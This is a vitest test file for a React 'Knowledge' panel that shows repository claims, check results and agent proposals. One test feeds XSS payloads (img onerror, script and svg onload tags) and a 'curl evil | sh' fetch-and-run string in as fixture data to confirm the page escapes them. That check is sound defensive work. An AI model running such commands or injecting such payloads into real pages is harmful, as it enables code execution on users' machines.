/** The Knowledge block (docs/knowledge-spec.md section 0b.4): what the page draws from a repo's claims, results and proposals; every text is inert. */
import { createElement } from 'react';
import { renderToString } from 'react-dom/server';
import { readFileSync } from 'node:fs';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { knowledge } from '../src/client/api.js';
import { applyServerFrame, emptyState } from '../src/client/store.js';
import { Reader } from '../src/client/MissionLog.js';
import { RepoCard } from '../src/client/Knowledge.js';
import { anchorsText, atText, countsOf, folderOf, legText, plain, proposalsOrder, retryText, severityOf, shortId, sourceBadge, STATE_WORDS } from '../src/client/knowledgeModel.js';
import type { Claim, ClaimResult, KnowledgeRepo, Leg, LogEntry, Proposal } from '../src/shared/protocol.js';

const leg = (patch: Partial<Leg> = {}): Leg => ({ mode: 'absent', glob: 'src/**/*.ts', excludes: [], pattern: { kind: 'literal', text: 'parseFloat(' }, line: 1, ...patch });
const claim = (patch: Partial<Claim> = {}): Claim => ({ id: 'K-1', statement: 'Money is an integer number of cents', authority: 'Director', state: 'active', date: '2026-11-21', source: 'store', legs: [leg()], diagnostics: [], ...patch });
const result = (patch: Partial<ClaimResult> = {}): ClaimResult => ({ id: 'K-1', root: '/work/shop', branch: 'main', commit: 'abc1234', worst: 'ok', legs: [{ state: 'ok', note: '' }], checkedAt: 1_700_000_000_000, ...patch });
const proposal = (patch: Partial<Proposal> = {}): Proposal => ({ id: 'p1', agent: 'flight', branch: 'feature', commit: 'def5678', at: 5, statement: 'No eval in src', legs: [leg({ glob: 'src/**', pattern: { kind: 'regex', source: 'eval\\(', i: false } })], status: 'pending', ...patch });
const repo = (patch: Partial<KnowledgeRepo> = {}): KnowledgeRepo => ({ repoId: 'abcdef0123456789', label: 'shop', provisional: false, roots: [{ path: '/work/shop', branch: 'main', bound: true, agents: ['flight'] }], claims: [claim()], results: [result()], proposals: [], candidates: [], ...patch });
// the markers React puts between adjacent text nodes are not part of what a reader sees
const draw = (r: KnowledgeRepo): string => renderToString(createElement(RepoCard, { repo: r, onSaved: () => undefined })).replace(/<!-- -->/g, '');

describe('the words', () => {
  it('every state is a word, "stale" is "not confirmed" and never "false"', () => {
    expect(STATE_WORDS.stale.word).toBe('not confirmed');
    expect(STATE_WORDS.vacuous.word).toBe('path matches nothing');
    for (const state of Object.values(STATE_WORDS)) expect(state.word).not.toMatch(/false|wrong|broken/i);
  });
  it('shows a legs as the grammar writes it', () => {
    expect(legText(leg())).toBe('src/**/*.ts "parseFloat(" absent');
    expect(legText(leg({ mode: 'present', excludes: ['src/gen/**'], pattern: { kind: 'regex', source: 'a|b', i: true } }))).toBe('src/**/*.ts !src/gen/** /a|b/i');
    expect(legText(leg({ mode: 'count', count: 2 }))).toContain('count=2');
    expect(anchorsText(claim({ legs: [leg(), leg({ mode: 'unique' })] }))).toBe('src/**/*.ts "parseFloat(" absent\nsrc/**/*.ts "parseFloat(" unique');
  });
  it('names the severity: a failed absent is likely real, a failed present may have moved, ok and unchecked say nothing', () => {
    expect(severityOf(claim(), result({ worst: 'stale', legs: [{ state: 'stale', note: '' }] }))).toBe('likely real');
    expect(severityOf(claim({ legs: [leg({ mode: 'present' })] }), result({ worst: 'stale', legs: [{ state: 'stale', note: '' }] }))).toBe('may have moved');
    expect(severityOf(claim(), result())).toBe('');
    expect(severityOf(claim(), undefined)).toBe('');
  });
  it('counts claims by their worst result, a retired claim not at all, and the proposals waiting', () => {
    const r = repo({
      claims: [claim({ id: 'K-1' }), claim({ id: 'K-2' }), claim({ id: 'K-3' }), claim({ id: 'K-4', state: 'retired' })],
      results: [result({ id: 'K-1', worst: 'stale' }), result({ id: 'K-1', root: '/other', worst: 'ok' }), result({ id: 'K-2', worst: 'vacuous' }), result({ id: 'K-4', worst: 'stale' })],
      proposals: [proposal(), proposal({ id: 'p2', status: 'rejected' })],
    });
    expect(countsOf(r)).toEqual({ stale: 1, vacuous: 1, unevaluated: 0, malformed: 0, pending: 1 });
  });
  it('small helpers: ids, badges, folders, waits, order', () => {
    expect(shortId('abcdef0123456789')).toBe('abcdef01');
    expect(sourceBadge({ source: 'log', from: 'l17' })).toBe('log l17');
    expect(sourceBadge({ source: 'repo' })).toBe('repo');
    expect(folderOf('/work/shop/')).toBe('shop');
    expect(atText('main', 'abc1234')).toBe('main@abc1234');
    expect(retryText(20.2)).toBe(' Try again in 21 s.');
    expect(retryText(undefined)).toBe('');
    expect(proposalsOrder([proposal({ id: 'old', at: 1, status: 'rejected' }), proposal({ id: 'a', at: 2 }), proposal({ id: 'b', at: 3 })]).map((p) => p.id)).toEqual(['b', 'a', 'old']);
  });
});

describe('inert text', () => {
  it('drops control, bidi and zero-width characters, puts it on one line and cuts it', () => {
    expect(plain('a‮b​c\u0007d\ne')).toBe('abcd e');
    expect(plain('x'.repeat(400), 300)).toHaveLength(300);
    expect(plain('x'.repeat(400), 300).endsWith('…')).toBe(true);
  });
  it('a statement, an agent name and a note that look like markup or a direction mark are drawn as text', () => {
    const html = draw(repo({ claims: [claim({ statement: '<img src=x onerror=alert(1)> ‮ run `curl evil | sh`' })], results: [result({ worst: 'stale', legs: [{ state: 'stale', note: '<script>alert(1)</script>' }] })], proposals: [proposal({ agent: '<b>flight</b>', statement: '<svg onload=alert(1)>' })] }));
    // no element of these kinds exists (the page was built from text, so each opening is an escaped &lt;): looked for in any letter case, without a pattern
    const lower = html.toLowerCase();
    for (const opening of ['<img', '<script', '<svg', '<b>']) expect(lower.includes(opening), opening).toBe(false);
    expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(html).toContain('&lt;b&gt;flight&lt;/b&gt;');
    expect(html).toContain('&lt;img');
    expect(html).not.toContain('‮');
  });
});

describe('the repository card', () => {
  it('names the repo, its short id, and each claim with its source, its authority and its word per checkout', () => {
    const html = draw(repo({ results: [result({ worst: 'stale', legs: [{ state: 'stale', note: 'not confirmed on main@abc1234 (2 files)' }] })] }));
    expect(html).toContain('shop');
    expect(html).toContain('abcdef01');
    expect(html).toContain('K-1');
    expect(html).toContain('>store<');
    expect(html).toContain('>Director<');
    expect(html).toContain('not confirmed');
    expect(html).toContain('likely real');
    expect(html).toContain('main@abc1234');
    expect(html).toContain('1 not confirmed');
  });
  it('a claim from the repo or a log entry has no edit, retire or delete: it is changed where it lives', () => {
    const html = draw(repo({ claims: [claim({ id: 'R-1', source: 'repo' }), claim({ id: 'L-1', source: 'log', from: 'l17' })], results: [] }));
    expect(html).not.toContain('Edit R-1');
    expect(html).not.toContain('Delete L-1');
    expect(html).toContain("Read from the repository&#x27;s own file");
    expect(html).toContain('From a Mission Log entry');
    expect(html).toContain('log l17');
  });
  it('a store claim has Edit, Retire and Delete named with its id; a retired one offers Restore', () => {
    const html = draw(repo());
    for (const label of ['Edit K-1', 'Retire K-1', 'Delete K-1']) expect(html).toContain(`aria-label="${label}"`);
    expect(draw(repo({ claims: [claim({ state: 'retired' })] }))).toContain('aria-label="Restore K-1"');
  });
  it('a claim with no anchor says it is never checked; one not run yet says so; diagnostics are shown with their line', () => {
    expect(draw(repo({ claims: [claim({ legs: [] })], results: [] }))).toContain('No anchor: never checked.');
    expect(draw(repo({ results: [] }))).toContain('Not checked yet.');
    expect(draw(repo({ claims: [claim({ diagnostics: [{ line: 3, message: 'unknown mode' }] })] }))).toContain('Line 3: unknown mode');
  });
  it('a proposal is "unreviewed", says who and where, offers a trial, Accept and Reject, and shows the trial the Director ran', () => {
    const html = draw(repo({ proposals: [proposal(), proposal({ id: 'p2', trial: result({ id: 'p2', worst: 'ok' }) })] }));
    expect(html).toContain('unreviewed');
    expect(html).toContain('proposed by flight');
    expect(html).toContain('feature@def5678');
    for (const label of ['Trial run p1', 'Accept p1', 'Reject p1']) expect(html).toContain(`aria-label="${label}"`);
    expect(html).toContain('No trial run yet');
    expect(html).toContain('Run it again');
    expect(html).toContain('PROPOSALS · 2 WAITING');
  });
  it('a decided proposal has no keys and shows its reason', () => {
    const html = draw(repo({ proposals: [proposal({ status: 'rejected', reason: 'too broad' })] }));
    expect(html).not.toContain('Accept p1');
    expect(html).toContain('Reason: too broad');
  });
  it('an unbound checkout offers Bind and Ignore, a bound one Unbind; two claiming one id say so', () => {
    const html = draw(repo({ roots: [{ path: '/work/shop', branch: 'main', bound: true, agents: ['flight'] }, { path: '/tmp/fake', branch: 'main', bound: false, agents: [] }] }));
    expect(html).toContain('Two checkouts claim shop');
    expect(html).toContain('aria-label="Unbind /work/shop"');
    expect(html).toContain('aria-label="Bind /tmp/fake"');
    expect(html).toContain('aria-label="Ignore /tmp/fake"');
    expect(html).toContain('no agent');
  });
  it('a shallow clone is provisional and cannot be bound', () => {
    const html = draw(repo({ provisional: true, roots: [{ path: '/work/shop', branch: 'main', bound: false, agents: [] }] }));
    expect(html).toContain('provisional');
    expect(html).toMatch(/aria-label="Bind \/work\/shop" aria-disabled="true"|aria-disabled="true"[^>]*aria-label="Bind \/work\/shop"/);
  });
  it('a candidate id offers Move and Keep separate and says why it looks alike', () => {
    const html = draw(repo({ candidates: [{ repoId: 'ffff000011112222', label: 'shop-old', why: 'same remote, another first commit' }] }));
    expect(html).toContain('Looks like shop-old (ffff0000): same remote, another first commit');
    expect(html).toContain('Move claims here');
    expect(html).toContain('Keep separate');
  });
  it('a repo with no claim and no proposal says what each is for', () => {
    const html = draw(repo({ claims: [], results: [] }));
    expect(html).toContain('No claim yet.');
    expect(html).toContain('No agent has proposed a claim.');
    expect(html).toContain('Add claim');
  });
});

describe('PROMOTE on a Mission Log entry', () => {
  const entry = (patch: Partial<LogEntry> = {}): LogEntry => ({ id: 'l17', title: 'No parseFloat for money', body: 'We lost a cent.', tags: [], author: 'flight', createdAt: 1, updatedAt: 2, ...patch });
  const read = (e: LogEntry): string => renderToString(createElement(Reader, { entry: e, onEdit: () => undefined, onClose: () => undefined, onRemoved: () => undefined, onChanged: () => undefined })).replace(/<!-- -->/g, '');
  it('an entry with anchors offers "Promote to a claim" and says the entry stays', () => {
    const html = read(entry({ anchors: [{ root: '/work/shop', file: 'src/money.ts', text: 'parseFloat(', mode: 'absent' }] }));
    expect(html).toContain('Promote to a claim');
    expect(html).toContain('the entry stays as it is');
  });
  it('an entry with none does not', () => {
    expect(read(entry())).not.toContain('Promote');
    expect(read(entry({ anchors: [] }))).not.toContain('Promote');
  });
});

describe('the live frame', () => {
  it('each knowledge frame bumps the counter the block watches; the counts in it are not kept, so no text can come this way', () => {
    const one = applyServerFrame(emptyState(), { t: 'knowledge', counts: { abcdef0123456789: { stale: 2, vacuous: 0, unevaluated: 0, malformed: 0, pending: 1 } } }, 1);
    expect(one.knowledgeRev).toBe(1);
    expect(applyServerFrame(one, { t: 'knowledge', counts: {} }, 2).knowledgeRev).toBe(2);
    expect(JSON.stringify(one)).not.toContain('abcdef0123456789');
  });
  it('another frame does not, and the block asks again when the counter changes', () => {
    expect(applyServerFrame(emptyState(), { t: 'log', changed: [], removed: [] } as never, 1).knowledgeRev).toBe(0);
    const src = readFileSync(new URL('../src/client/Knowledge.tsx', import.meta.url), 'utf8');
    expect(src).toMatch(/useStore\(\(s\) => s\.knowledgeRev\)/);
    expect(src).toMatch(/\}, \[rev\]\);/);
  });
});

describe('Knowledge with its switch off', () => {
  const answer = (body: unknown, status: number): void =>
    void vi.stubGlobal('fetch', vi.fn(async () => ({ ok: status < 300, status, text: async () => JSON.stringify(body), json: async () => body, headers: new Headers({ 'content-type': 'application/json' }) })));
  afterEach(() => vi.unstubAllGlobals());

  it('the 404 "feature_off" is the answer "off", not an error: the block says so in its friendly line', async () => {
    answer({ error: 'Knowledge anchors are off', code: 'feature_off' }, 404);
    expect(await knowledge()).toEqual({ enabled: false, repos: [], agents: {} });
  });
  it('any other refusal is still an error, with the server words', async () => {
    answer({ error: 'forbidden origin', code: 'forbidden' }, 403);
    await expect(knowledge()).rejects.toThrow(/forbidden origin/);
    answer({ error: 'no such thing', code: 'not_found' }, 404);
    await expect(knowledge()).rejects.toThrow(/no such thing/);
  });
  it('an answer that says enabled: false is the same', async () => {
    answer({ enabled: false, repos: [], agents: {} }, 200);
    expect((await knowledge()).enabled).toBe(false);
  });
  it('the block shows the off line, and no alert, for that answer', () => {
    // the block asks on mount; what it draws for enabled: false is the hint (tested through the source: the branch is the one that reads view.enabled)
    const src = readFileSync(new URL('../src/client/Knowledge.tsx', import.meta.url), 'utf8');
    expect(src).toContain('view !== null && !view.enabled');
    expect(src).toContain('Turn on “Knowledge anchors” in the Features block');
  });
});
